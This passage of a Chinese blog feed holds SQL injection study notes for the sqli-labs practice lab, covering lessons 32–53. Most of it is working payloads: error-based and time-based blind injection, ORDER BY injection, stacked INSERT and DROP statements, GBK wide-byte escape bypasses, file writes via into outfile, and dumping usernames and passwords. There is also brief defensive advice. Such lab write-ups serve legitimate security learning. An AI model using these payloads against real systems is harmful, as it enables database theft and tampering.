        <content type="html"><![CDATA[<p>归纳：</p><p>判断闭合方式，目前掌握的闭合方式为单引号’’，单引号括号(’’)，双引号””，双引号括号(“”)</p><p>当单引号或者双引号出现回显或者语法错误时，如何判断是否带括号呢？</p><p>抄袭一波大神的判断方式</p><p>遇到SQL注入第一步判断闭合：<br> 首先尝试：</p><pre><code>?id=1’?id=1”12</code></pre><p>1如果都报错，则为整形闭合。</p><p>2如果单引号报错，双引号不报错。<br> 然后尝试</p><pre><code>?id=1' --+?id=1' #12</code></pre><p>无报错则单引号闭合。<br> 报错则单引号加括号。</p><p>3如果单引号不报错，双引号报错。<br> 然后尝试</p><pre><code>?id=1" --+?id=1" #12</code></pre><p>无报错则双引号闭合。<br> 报错则双引号加括号。</p><hr><p>1</p><p>输入（其中id=1,1是正确的数据库存在的值），正常回显</p><pre><code>?id=1 and true --+或者?id=true and true --+123</code></pre><p>输入，错误回显</p><pre><code>?id=1 and false --+或者?id=true and false --+123</code></pre><p>那么就是整形闭合</p><p>2</p><p>输入（其中id=1,1是正确的数据库存在的值），正常回显</p><pre><code>?id=1’ and true --+或者?id=true‘ and true --+123</code></pre><p>输入，错误回显</p><pre><code>?id=1’ and false --+或者?id=true‘ and false --+123</code></pre><p>那么就是单引号闭合，其他符号同理</p><h3 id="order-by闭合方式判断"><a href="#order-by闭合方式判断" class="headerlink" title="order by闭合方式判断"></a>order by闭合方式判断</h3><p>是否存在注入，若结果不同，就是存在注入，可以往下进行，若结果相同，判断是否为字符注入</p><pre><code>?sort=1 desc?sort=1 asc12</code></pre><p>是否为数字注入，显示结果不同，则为数字注入，相同，则往下进行</p><pre><code>?sort=right(version(),1)?sort=left(version(),1)12</code></pre><p>是否为布尔类型，此时我们可以用报错注入和延时注入</p><pre><code>?sort=rand(true)?sort=rand(false)12</code></pre><p>是否为字符注入，回显结果不一样，就说明闭合方式为单引号，其他闭合方式（双引号，单引号括号，双引号括号）同理</p><pre><code>?sort=1?sort=1'12</code></pre><h3 id="单引号转义绕过"><a href="#单引号转义绕过" class="headerlink" title="单引号转义绕过"></a>单引号转义绕过</h3><p>当时用单引号’，代码转义为\’，就使用如下方式替换掉单引号</p><pre><code>%df%27�'%EF%BF%BD123</code></pre><p>万能密码</p><pre><code>�' and1=1 #</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL:background-9:order by后注入原理</title>
      <link href="2021/02/10/sql-background-9-order-by-hou-zhu-ru-yuan-li/"/>
      <url>2021/02/10/sql-background-9-order-by-hou-zhu-ru-yuan-li/</url>
      
        <content type="html"><![CDATA[<p>换了新花样了，提示说有sort参数，sort不就是排序的意思吗？将sort换成1,2,3，查看回显结果，不太一样，当sort为4时，就回显不存在4列，查看回显结果也不难看出，一共就三列，id，username，password，sort值为几，就根据哪个进行排序，推测sort值前为order by</p><pre><code>http://192.168.239.138:86/Less-46/?sort=1</code></pre><p>那么，基于order by的SQL注入测试方法如下，显示结果不同（执行了用户输入的语句），则表明可以注入</p><pre><code>?sort=1 desc?sort=1 asc</code></pre><p>是否为数字注入，显示结果不同，则为数字注入，相同，则往下进行</p><pre><code>?sort=right(version(),1)?sort=left(version(),1)</code></pre><p>是否为布尔类型，此时我们可以用报错注入和延时注入</p><pre><code>?sort=rand(true)?sort=rand(false)</code></pre><p>true 和false结果是不同的</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL:sqlilabs less-46-53:order by后注入</title>
      <link href="2021/02/10/sql-sqlilabs-less-46-53-order-by-hou-zhu-ru/"/>
      <url>2021/02/10/sql-sqlilabs-less-46-53-order-by-hou-zhu-ru/</url>
      
        <content type="html"><![CDATA[<h2 id="Less-46"><a href="#Less-46" class="headerlink" title="Less-46"></a>Less-46</h2><p>源代码</p><pre><code>if(isset($id)){    $sql = "SELECT * FROM users ORDER BY $id";</code></pre><h5 id="报错注入："><a href="#报错注入：" class="headerlink" title="报错注入："></a>报错注入：</h5><pre><code>?sort=1 and updatexml(1,concat(0x7e,(select username from users limit 0,1)),0) --+</code></pre><pre><code>?sort=1 and extractvalue(1,concat(0x23,(select username from users limit 0,1),0x23))--+</code></pre><h5 id="时间盲注："><a href="#时间盲注：" class="headerlink" title="时间盲注："></a>时间盲注：</h5><pre><code>?sort=1 and if(ascii(substr(database(),1,1))=115,sleep(5),222)</code></pre><pre><code>?sort=(select if(substring(current,1,1)=char(115),benchmark(50000000,md5('1')),null) from (select database() as current) as tb1)</code></pre><h5 id="procedure-analyse参数注入"><a href="#procedure-analyse参数注入" class="headerlink" title="procedure analyse参数注入"></a>procedure analyse参数注入</h5><pre><code>?sort=1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1)    </code></pre><p><strong>导入导出文件into outfile参数注入</strong></p><pre><code>?sort=1 into outfile "D:\\software\\wamp\\www\\sql\\test1.txt"</code></pre><h5 id="考虑上传网马，利用lines-terminated-by"><a href="#考虑上传网马，利用lines-terminated-by" class="headerlink" title="考虑上传网马，利用lines terminated by"></a>考虑上传网马，利用lines terminated by</h5><pre><code>Into outtfile D:\\software\\wamp\\www\\sql\\test1.txt lines terminated by 0x</code></pre><h2 id="Less-47"><a href="#Less-47" class="headerlink" title="Less-47"></a>Less-47</h2><p>源代码</p><pre><code>$id=$_GET['sort'];    if(isset($id)){    $sql = "SELECT * FROM users ORDER BY '$id'";</code></pre><p>可见为字符型注入</p><h5 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h5><pre><code>?sort=1' and (select count(*) from information_schema.columns group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2)))--+</code></pre><h5 id="利用的mysql重复项的原理"><a href="#利用的mysql重复项的原理" class="headerlink" title="利用的mysql重复项的原理"></a>利用的mysql重复项的原理</h5><pre><code>?sort=1'and (select * from (select name_const(version(),1),name_const(version(),1))x)--+</code></pre><h5 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h5><pre><code>?sort=1' and if(ascii(substr(database(),1,1))=115,0,sleep(5))--+</code></pre><p><strong>procedure analyse参数后注入</strong></p><pre><code>?sort=1' procedure analyse(extractvalue(rand(),concat(0x3a,version())),1)--+</code></pre><p><strong>导入导出文件into outfile参数</strong></p><pre><code>?sort=1' into outfile "D:\\software\\wamp\\www\\sql\\test2.txt"--+</code></pre><h2 id="Less-48"><a href="#Less-48" class="headerlink" title="Less-48"></a>Less-48</h2><p>源代码</p><pre><code>$id=$_GET['sort'];    if(isset($id)){    $sql = "SELECT * FROM users ORDER BY $id";</code></pre><p>本关与less-46的区别在于报错注入不能使用，不进行错误回显，因此其他的方法我们依旧是可以使用的</p><p><strong>利用sort=rand(true/false)进行判断</strong>                                                                                                                                                                                                                                                                 </p><pre><code>?sort=rand(ascii(left(database(),1))=115)</code></pre><h5 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h5><pre><code>?sort=1 and (If(ascii(substr(database(),1,1))=115,0,sleep(5)))</code></pre><h5 id="文件写入"><a href="#文件写入" class="headerlink" title="文件写入"></a>文件写入</h5><pre><code>?sort=1 into outfile ""</code></pre><h2 id="Less-49"><a href="#Less-49" class="headerlink" title="Less-49"></a>Less-49</h2><p>源代码</p><pre><code>$id=$_GET['sort'];    if(isset($id))    $sql = "SELECT * FROM users ORDER BY '$id'";</code></pre><pre><code>?sort=1' and (if(ascii(substr((select username from users where id=1),1,1))=115,0,sleep(5)))--+</code></pre><pre><code>?sort=1' and (If(ascii(substr(database(),1,1))=115,0,sleep(5)))</code></pre><h2 id="Less-50"><a href="#Less-50" class="headerlink" title="Less-50"></a>Less-50</h2><p>源代码</p><pre><code>$id=$_GET['sort'];    if(isset($id)){    $sql="SELECT * FROM users ORDER BY $id";    if (mysqli_multi_query($con1, $sql)){            if ($result = mysqli_store_result($con1))</code></pre><p>源码中使用的mysqli_multi_query()函数，而之前使用的是mysqli_query()，区别在于mysqli_multi_query()可以执行多个sql语句，而mysqli_query()只能执行一个sql语句</p><pre><code>?sort=1 and (If(ascii(substr(database(),1,1))=115,0,sleep(5)))</code></pre><pre><code>?sort=rand((ascii(mid((select database()),1,1)))&gt;65)</code></pre><pre><code>?sort=1;create table less50 like users</code></pre><h2 id="Less-51"><a href="#Less-51" class="headerlink" title="Less-51"></a>Less-51</h2><p>源代码</p><pre><code>$id=$_GET['sort'];    if(isset($id)){    $sql="SELECT * FROM users ORDER BY '$id'";    if (mysqli_multi_query($con1, $sql)) {            if ($result = mysqli_store_result($con1))</code></pre><pre><code>?sort=1' and (if(ascii(substr((select username from users where id=1),1,1))=115,0,sleep(5)))--+</code></pre><pre><code>?sort=1';create table less51 like users--+</code></pre><h2 id="Less-52"><a href="#Less-52" class="headerlink" title="Less-52"></a>Less-52</h2><p>源代码</p><pre><code>$id=$_GET['sort'];    if(isset($id)){    $sql="SELECT * FROM users ORDER BY $id";</code></pre><p>关键点在于没有报错信息</p><pre><code>?sort=rand(ascii(left(database(),1))=115)</code></pre><pre><code>?sort=rand((ascii(mid((select database()),1,1)))&gt;65)</code></pre><pre><code>?sort=if(ascii(mid(database(),1,1))=115,sleep(0.1),0)</code></pre><pre><code>?sort=1;create table less52 like users</code></pre><h2 id="Less-53"><a href="#Less-53" class="headerlink" title="Less-53"></a>Less-53</h2><p>源代码</p><pre><code>$id=$_GET['sort'];    if(isset($id)){    $sql="SELECT * FROM users ORDER BY '$id'";</code></pre><p>使用的mysqli_multi_query()函数，闭合方式为单引号’，关键点在于也没有报错信息吧</p><pre><code>?sort=1' and if(ascii(mid(database(),1,1))=115,sleep(0.1),0)--+</code></pre><pre><code>?sort=1';create table less53 like users--+</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL:sqlilabs less-38-45:堆叠注入</title>
      <link href="2021/01/30/sql-sqlilabs-less-38-45-dui-die-zhu-ru/"/>
      <url>2021/01/30/sql-sqlilabs-less-38-45-dui-die-zhu-ru/</url>
      
        <content type="html"><![CDATA[<h2 id="Less-38"><a href="#Less-38" class="headerlink" title="Less-38"></a>Less-38</h2><p>源代码：</p><pre><code>`// take the variables if(isset($_GET['id'])){$id=$_GET['id'];//logging the connection parameters to a file for analysis.$fp=fopen('result.txt','a');fwrite($fp,'ID:'.$id."\n");fclose($fp);// connectivity//mysql connections for stacked query examples.$con1 = mysqli_connect($host,$dbuser,$dbpass,$dbname);// Check connectionif (mysqli_connect_errno($con1)){    echo "Failed to connect to MySQL: " . mysqli_connect_error();}else{    @mysqli_select_db($con1, $dbname) or die ( "Unable to connect to the database: $dbname");}$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";</code></pre><p>由于在这里使用了执行一个或多个sql语句的函数mysqli_multi_query。<br>  所以可以尝试堆叠注入，堆叠注入就是执行多条SQL语句，通过;分割；在实战中，由于正常数据库只会回显出我们想要的结果，所以，堆叠注入在黑盒测试下只能通过模糊测试来进行测试。由于是直接执行多条SQL语句，所以对SQL语句就并无限制，可以通过堆叠注入增删改查等数据库操作。<br> 我们在知道数据库结构后尝试进行插入数据操作</p><h5 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h5><pre><code>?id=1';insert into users(id,username,password) values ('38','less38','hello')--+</code></pre><h2 id="Less-39"><a href="#Less-39" class="headerlink" title="Less-39"></a>Less-39</h2><pre><code>// connectivity//mysql connections for stacked query examples.$con1 = mysqli_connect($host,$dbuser,$dbpass,$dbname);// Check connectionif (mysqli_connect_errno($con1)){    echo "Failed to connect to MySQL: " . mysqli_connect_error();}else{    @mysqli_select_db($con1, $dbname) or die ( "Unable to connect to the database: $dbname");}$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";/* execute multi query */if (mysqli_multi_query($con1, $sql)){    /* store first result set */    if ($result = mysqli_store_result($con1))    {        if($row = mysqli_fetch_row($result))        {            echo '&lt;font size = "5" color= "#00FF00"&gt;';                printf("Your Username is : %s", $row[1]);            echo "&lt;br&gt;";            printf("Your Password is : %s", $row[2]);            echo "&lt;br&gt;";            echo "&lt;/font&gt;";        }//            mysqli_free_result($result);    }        /* print divider */    if (mysqli_more_results($con1))    {            //printf("-----------------\n");    }     //while (mysqli_next_result($con1));}else     {    echo '&lt;font size="5" color= "#FFFF00"&gt;';    print_r(mysqli_error($con1));    echo "&lt;/font&gt;";      }</code></pre><h5 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h5><pre><code>?id=1;insert into users(id,username,password) values ('39','less39','hello')--+</code></pre><h2 id="Less-40"><a href="#Less-40" class="headerlink" title="Less-40"></a>Less-40</h2><h5 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h5><pre><code>?id=1');insert into users(id,username,password) values ('40','less40','hello')--+</code></pre><h2 id="Less-41"><a href="#Less-41" class="headerlink" title="Less-41"></a>Less-41</h2><h5 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h5><pre><code>?id=1;insert into users(id,username,password) values ('41','less41','hello')--+</code></pre><h2 id="Less-42"><a href="#Less-42" class="headerlink" title="Less-42"></a>Less-42</h2><p>源代码：</p><h5 id="pass-change-php"><a href="#pass-change-php" class="headerlink" title="pass_change.php"></a>pass_change.php</h5><pre><code>$username= $_SESSION["username"];$curr_pass= mysql_real_escape_string($_POST['current_password']);$pass= mysql_real_escape_string($_POST['password']);$re_pass= mysql_real_escape_string($_POST['re_password']);$sql = "UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' ";</code></pre><h5 id="login-php"><a href="#login-php" class="headerlink" title="login.php"></a>login.php</h5><pre><code>$username = mysqli_real_escape_string($con1,$_POST["login_user"]);$password = $_POST["login_password"];$sql = "SELECT * FROM users WHERE username='$username' and password='$password'";</code></pre><p>pdate更新数据后，经过mysql_real_escape_string()处理后的数据，存入到数据库当中后不会发生变化。在select调用的时候才能发挥作用。所以不用考虑在更新密码处进行注入，这关和二次注入的思路是不一样的。</p><p>Password变量在post过程中，没有通过mysql_real_escape_string()函数的处理。因此在登录的时候密码选项我们可以进行attack。</p><h5 id="所以密码的payload为"><a href="#所以密码的payload为" class="headerlink" title="所以密码的payload为"></a>所以密码的payload为</h5><pre><code>a';insert into users(id,username,password) values(42,'Less42','Less42')#</code></pre><h2 id="Less-43"><a href="#Less-43" class="headerlink" title="Less-43"></a>Less-43</h2><h5 id="pass-change-php-1"><a href="#pass-change-php-1" class="headerlink" title="pass_change.php"></a>pass_change.php</h5><pre><code>$username = mysqli_real_escape_string($con1, $_POST["login_user"]);   $password = $_POST["login_password"];   if (mysqli_connect_errno($con1)){       echo "Failed to connect to MySQL: " . mysqli_connect_error();   }   else{       @mysqli_select_db($con1, $dbname) or die ( "Unable to connect to the database ######: ");   }   $sql = "SELECT * FROM users WHERE username=('$username') and password=('$password')";</code></pre><p>可以看到，对参数username进行mysqli_real_escape_string，password没有进行任何处理，且闭合方式为单引号括号’)</p><h5 id="login-php-1"><a href="#login-php-1" class="headerlink" title="login.php"></a>login.php</h5><pre><code>$username = mysqli_real_escape_string($con1, $_POST["login_user"]);$password = $_POST["login_password"];$sql = "SELECT * FROM users WHERE username=('$username') and password=('$password')";</code></pre><h5 id="password"><a href="#password" class="headerlink" title="password"></a>password</h5><pre><code>a');insert into users(id,username,password) values(43,'Less43','Less43')#</code></pre><h2 id="Less-44"><a href="#Less-44" class="headerlink" title="Less-44"></a>Less-44</h2><pre><code>$username = mysqli_real_escape_string($con1, $_POST["login_user"]);   $password = $_POST["login_password"];   if (mysqli_connect_errno($con1)){       echo "Failed to connect to MySQL: " . mysqli_connect_error();   }   else{       @mysqli_select_db($con1, $dbname) or die ( "Unable to connect to the database ######: ");   }   $sql = "SELECT * FROM users WHERE username='$username' and password='$password'";</code></pre><p>这里采用盲注：</p><pre><code>a';insert into users(id,username,password) values ('44','less44','hello')#</code></pre><h2 id="Less-45"><a href="#Less-45" class="headerlink" title="Less-45"></a>Less-45</h2><pre><code>$username = mysqli_real_escape_string($con1, $_POST["login_user"]);   $password = $_POST["login_password"];   if (mysqli_connect_errno($con1)){       echo "Failed to connect to MySQL: " . mysqli_connect_error();   }   else{       @mysqli_select_db($con1, $dbname) or die ( "Unable to connect to the database ######: ");   }   $sql = "SELECT * FROM users WHERE username=('$username') and password=('$password')";</code></pre><pre><code>a');insert into users(id,username,password) values(45,'Less45','Less45')#</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL:background-8:堆叠注入原理</title>
      <link href="2021/01/29/sql-background-8-dui-die-zhu-ru-yuan-li/"/>
      <url>2021/01/29/sql-background-8-dui-die-zhu-ru-yuan-li/</url>
      
        <content type="html"><![CDATA[<p>Stacked  injections:堆叠注入。从名词的含义就可以看到应该是一堆sql语句（多条）一起执行。而在真实的运用中也是这样的，我们知道在mysql中，主要是命令行中，每一条语句结尾加 ; 表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做stacked injection。</p><h3 id="0x01-原理介绍"><a href="#0x01-原理介绍" class="headerlink" title="0x01 原理介绍"></a>0x01 原理介绍</h3><p>在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ;  结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union  injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union  all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。</p><p>例如以下这个例子。</p><p><img src="https://images2015.cnblogs.com/blog/669054/201608/669054-20160811220533906-1304680635.png" alt="img"></p><p>当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p><h3 id="0x02-堆叠注入的局限性"><a href="#0x02-堆叠注入的局限性" class="headerlink" title="0x02 堆叠注入的局限性"></a>0x02 堆叠注入的局限性</h3><p>堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。</p><p><img src="https://images2015.cnblogs.com/blog/669054/201608/669054-20160811220534984-271396471.png" alt="img"></p><p>Ps：此图是从原文中截取过来的，因为我个人的测试环境是php+mysql，是可以执行的，此处对于mysql/php存在质疑。但个人估计原文作者可能与我的版本的不同的原因。</p><p>虽然我们前面提到了堆叠查询可以执行任意的sql语句，但是这种注入方式并不是十分的完美的。在我们的web系统中，因为代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的。</p><p>因此，在读取数据时，我们建议使用union（联合）注入。同时在使用堆叠注入之前，我们也是需要知道一些数据库相关信息的，例如表名，列名等信息。</p><h3 id="0x03-各个数据库实例介绍"><a href="#0x03-各个数据库实例介绍" class="headerlink" title="0x03 各个数据库实例介绍"></a>0x03 各个数据库实例介绍</h3><p>本节我们从常用数据库角度出发，介绍几个类型的数据库的相关用法。数据库的基本操作，增删查改。以下列出数据库相关堆叠注入的基本操作。</p><p><strong>Mysql数据库</strong></p><p>（1）新建一个表</p><p>select * from users where id=1;create table test like users;</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202004/1375459-20200408181511625-1655980737.png" alt="img"></p><p>执行成功，我们再去看一下是否新建成功表。</p><p>show tables;</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202004/1375459-20200408181539058-1361406792.png" alt="img"></p><p>（2）删除上面新建的test表</p><p>select * from users where id=1;drop table test;</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202004/1375459-20200408181625779-1824771503.png" alt="img"></p><p>查看是否删除成功</p><p>show tables;</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202004/1375459-20200408181702371-256896974.png" alt="img"></p><p>（3）查询数据</p><p>select * from users where id=1;select 1,2,3;</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202004/1375459-20200408181751702-1896581718.png" alt="img"></p><p>（4）加载文件</p><p>select * from users where id=1;select load_file(‘c:/test.php’);</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202004/1375459-20200408181938100-2055788800.png" alt="img"></p><p>（5）修改数据</p><p>select * from users where id=1;insert into users(id,username,password) values(‘100’,’new’,’new’);</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202004/1375459-20200408182020578-971023255.png" alt="img"></p><p>查看是否插入成功。</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202004/1375459-20200408182104745-1282485266.png" alt="img"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL:sqlilabs-less-32-37-宽字节注入</title>
      <link href="2021/01/25/sql-sqlilabs-less-32-37-kuan-zi-jie-zhu-ru/"/>
      <url>2021/01/25/sql-sqlilabs-less-32-37-kuan-zi-jie-zhu-ru/</url>
      
        <content type="html"><![CDATA[<h2 id="Less-32"><a href="#Less-32" class="headerlink" title="Less-32"></a>Less-32</h2><p>代码中含有：</p><pre><code>function check_addslashes($string){    $string = preg_replace('/'. preg_quote('\\') .'/', "\\\\\\", $string);    //过滤反斜线符号    $string = preg_replace('/\'/i', '\\\'', $string);       //用反斜杠转义单引号    $string = preg_replace('/\"/', "\\\"", $string);    //用反斜杠转义双引号    return $string;}$id=check_addslashes($_GET['id']);mysql_query("SET NAMES gbk");$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";print_r(mysql_error());</code></pre><h5 id="其中三个preg-replace-函数分别为："><a href="#其中三个preg-replace-函数分别为：" class="headerlink" title="其中三个preg_replace()函数分别为："></a>其中三个preg_replace()函数分别为：</h5><pre><code>1.过滤反斜线符号2.用反斜杠转义单引号3.用反斜杠转义双引号</code></pre><p>即：函数为过滤 ‘ \ 的函数，将 ‘ 转为 ' ， 将 \ 转为 \ ，将 “ 转为 "。</p><h5 id="此此处我们只能考虑background中的第一个思路，添加一个-df后，将-5c吃掉即可。"><a href="#此此处我们只能考虑background中的第一个思路，添加一个-df后，将-5c吃掉即可。" class="headerlink" title="此此处我们只能考虑background中的第一个思路，添加一个%df后，将%5c吃掉即可。"></a>此此处我们只能考虑background中的第一个思路，添加一个%df后，将%5c吃掉即可。</h5><p>因此进行尝试：</p><pre><code>?id=1'Hint: The Query String you input is escaped as : 1\'The Query String you input in Hex becomes : 315c27</code></pre><p>因此爆数据库：</p><pre><code>?id=-1%df' union select 1,(select group_concat(schema_name) from information_schema.schemata),3--+</code></pre><p>跳过步骤直接爆信息：</p><pre><code>?id=-1%df' union select 1,(select group_concat(username,0x3a,password) from users),3--+</code></pre><h2 id="Less-33"><a href="#Less-33" class="headerlink" title="Less-33"></a>Less-33</h2><p>代码中含有：</p><pre><code>function check_addslashes($string){    $string= addslashes($string);        return $string;}$id=check_addslashes($_GET['id']);mysql_query("SET NAMES gbk");$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";print_r(mysql_error());</code></pre><h3 id="介绍addslashes-函数："><a href="#介绍addslashes-函数：" class="headerlink" title="介绍addslashes()函数："></a>介绍addslashes()函数：</h3><p>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。</p><p>预定义字符是：</p><ul><li>单引号（’）</li><li>双引号（”）</li><li>反斜杠（\）</li></ul><p>提示：该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串。</p><p>addslashes()函数和我们在32关实现的功能基本一致的，所以我们依旧可以利用%df进行绕过。</p><h4 id="Notice："><a href="#Notice：" class="headerlink" title="Notice："></a>Notice：</h4><p>使用addslashes(),我们需要将mysql_query设置为binary的方式，才能防御此漏洞。</p><pre><code>mysql_query("SET character_set_connection=gbk,character_set_result=gbk,character_set_client=binary",$conn);</code></pre><h4 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h4><p>与less-32一致</p><pre><code>?id=-1%df' union select 1,database(),3--+</code></pre><h2 id="Less-34"><a href="#Less-34" class="headerlink" title="Less-34"></a>Less-34</h2><p>代码中含有：</p><pre><code>$uname1=$_POST['uname'];$passwd1=$_POST['passwd'];$uname = addslashes($uname1);$passwd= addslashes($passwd1);mysql_query("SET NAMES gbk");@$sql="SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1";</code></pre><p>可见这里对name和password进行了post和addslashes处理，%df可以将转义的反斜杠给吃掉。而GET型的方式我们是以url形式提交的，因此数据会通过urlencode如何将方法用在post型的注入当中，我们此处介绍一个新的方法。将utf-8转换为utf-16或 utf-32，例如将 ‘ 转为utf-16为 �’ 。我们就可以利用这个方式进行尝试。</p><h4 id="我tm直接给你全整出来："><a href="#我tm直接给你全整出来：" class="headerlink" title="我tm直接给你全整出来："></a>我tm直接给你全整出来：</h4><pre class=" language-1"><code class="language-1">�'union select 1,group_concat(username,0x3a,password) from users#</code></pre><h4 id="双查询同样也行"><a href="#双查询同样也行" class="headerlink" title="双查询同样也行:"></a>双查询同样也行:</h4><pre><code>�' union select count(*), concat((select database()), floor(rand()*2))as a from information_schema.tables group by a#</code></pre><h2 id="Less-35"><a href="#Less-35" class="headerlink" title="Less-35"></a>Less-35</h2><p>源代码：</p><pre><code>function check_addslashes($string){$string = addslashes($string);return $string;}$id=check_addslashes($_GET['id']);mysql_query("SET NAMES gbk");$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";</code></pre><h5 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h5><pre><code>?id=-1 union select 1,database(),3--+</code></pre><h2 id="Less-36"><a href="#Less-36" class="headerlink" title="Less-36"></a>Less-36</h2><p>源代码：</p><pre><code>function check_quotes($string){    $string= mysql_real_escape_string($string);        return $string;}$id=check_quotes($_GET['id']);mysql_query("SET NAMES gbk");$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";print_r(mysql_error());</code></pre><p>可以看到这边就不是用addslashes了，用的mysql_real_escape_string()函数进行的过滤。</p><h3 id="mysql-real-escape-string-函数："><a href="#mysql-real-escape-string-函数：" class="headerlink" title="mysql_real_escape_string()函数："></a>mysql_real_escape_string()函数：</h3><p>mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。</p><p>下列字符受影响：</p><ul><li>\x00</li><li>\n</li><li>\r</li><li>\</li><li>‘</li><li>“</li><li>\x1a</li></ul><p>如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。</p><p>但是因mysql我们并没有设置成gbk，所以mysql_real_escape_string()依旧能够被突破。方法和上述是一样的。</p><h5 id="1-df突破法："><a href="#1-df突破法：" class="headerlink" title="1.%df突破法："></a>1.%df突破法：</h5><pre><code>?id=-1%df' union select 1,user(),3--+</code></pre><h5 id="2-utf-16突破："><a href="#2-utf-16突破：" class="headerlink" title="2.utf-16突破："></a>2.utf-16突破：</h5><pre><code>?id=-1%EF%BF%BD%27union select 1,user(),3--+</code></pre><h4 id="设置mysql为gbk"><a href="#设置mysql为gbk" class="headerlink" title="设置mysql为gbk"></a>设置mysql为gbk</h4><pre><code>mysql_set_charset('gbk','$conn')</code></pre><h2 id="Less-37"><a href="#Less-37" class="headerlink" title="Less-37"></a>Less-37</h2><p>源代码:</p><pre><code>$uname1=$_POST['uname'];$passwd1=$_POST['passwd'];$uname = mysql_real_escape_string($uname1);$passwd= mysql_real_escape_string($passwd1);mysql_query("SET NAMES gbk");@$sql="SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1";</code></pre><p>大体上和less-34相同，这里处理post内容用的是mysql_real_escape_string()函数，而不是addslashes()函数，用万能密码：</p><pre><code>�'union select 1,group_concat(username,0x3a,password) from users#</code></pre><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>从上面的几关当中，可以总结一下过滤 ‘ \  常用的三种方式是使用preg_replace()直接replace，addslashes()，mysql_real_escape_string()。三种方式仅仅依靠一个函数是不能完全防御的，所以我们在编写代码的时候需要考虑的更加仔细。同时在上述过程中，我们也给出三种防御的方式：</p><ul><li><p>使用preg_replace()直接replace时，不要将mysql编码设置为gbk。</p></li><li><p>使用addslashes()时，我们需要将mysql_query设置为binary的方式，才能防御此漏洞</p></li><li><p>使用mysql_real_escape_string()时，需要将mysql设置为gbk即可。</p></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL:background-7:宽字节注入原理</title>
      <link href="2021/01/24/sql-background-7-kuan-zi-jie-zhu-ru-yuan-li/"/>
      <url>2021/01/24/sql-background-7-kuan-zi-jie-zhu-ru-yuan-li/</url>
      
        <content type="html"><![CDATA[<p>原理：mysql在使用GBK编码的时候，会认为两个字符为一个汉字，例如%aa%5c就是一个汉字（前一个ascii码大于128才能到汉字的范围）。我们在过滤 ‘ 的时候，往往利用的思路是将 ‘ 转换为 ' （转换的函数或者思路会在每一关遇到的时候介绍）。</p><p>因此我们在此想办法将 ‘ 前面添加的 \ 除掉，一般有两种思路：</p><ol><li>%df吃掉 \ 具体的原因是urlencode(') =  %5c%27，我们在%5c%27前面添加%df，形成%df%5c%27，而上面提到的mysql在GBK编码方式的时候会将两个字节当做一个汉字，此事%df%5c就是一个汉字，%27则作为一个单独的符号在外面，同时也就达到了我们的目的。</li><li>将 ' 中的 \ 过滤掉，例如可以构造 %**%5c%5c%27的情况，后面的%5c会被前面的%5c给注释掉。这也是bypass的一种方法。</li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL:sqlilabs less-29-31:HPP参数污染攻击</title>
      <link href="2021/01/21/sql-sqlilabs-less-29-31-hpp-can-shu-wu-ran-gong-ji/"/>
      <url>2021/01/21/sql-sqlilabs-less-29-31-hpp-can-shu-wu-ran-gong-ji/</url>
      
